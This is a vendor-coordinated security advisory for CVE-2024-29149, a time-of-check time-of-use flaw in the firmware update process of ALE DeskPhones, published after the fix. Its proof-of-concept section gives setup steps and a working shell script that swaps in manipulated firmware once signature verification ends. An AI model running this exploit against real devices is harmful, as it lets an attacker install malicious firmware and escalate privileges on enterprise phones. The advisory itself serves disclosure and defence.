Vulnerability Type: Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2024-02-19
Solution Date: 2024-05-06
Public Disclosure: 2024-05-06
CVE Reference: CVE-2024-29149
Author of Advisory: Moritz Abrell, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ALE DeskPhones are modern desk phones which are used for the operation
in enterprise environments.
The manufacturer describes the product as follows (see [1]):
"Innovative deskphones and digital phones, delivering rich communications
in sleek designs, are essential for hybrid work."
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Due to a time-of-check time-of-use vulnerability, an authenticated
attacker is able to replace the verified firmware image with malicious
firmware during the update process of the phone.
This allows, e.g., for local privilege escalation.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
1. Download manipulated firmware to the "/tmp" directory of the phone
with the "admin" (default user) access (e.g., via SSH or via USB
debugging (UART)).
2. Download the following script to the phone and execute it.
This script waits until the firmware verification of the original
firmware is successful and then replaces it with the manipulated
firmware:
#####################################
#!/bin/sh
PROC\_NAME="upgrade\_check --signature"
FLAG=""
while true
do
if [ "$FLAG" ]
then
if [ "$(ps | grep "$PROC\_NAME" | egrep -v 'grep')" ]
then
continue
else
echo "[\*] Process finished"
cat /tmp/sip86x8P-manipulated > /tmp/sip86x8P
echo "[+] Image overwritten"
break
fi
fi
if [ "$(ps | grep "$PROC\_NAME" | egrep -v 'grep')" ]
then
echo "[\*] Signature verification process found"
FLAG="1"
fi
done
#####################################
3. Afterward, the replaced and manipulated firmware will be installed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Update the devices according to the manufacturer note[4].
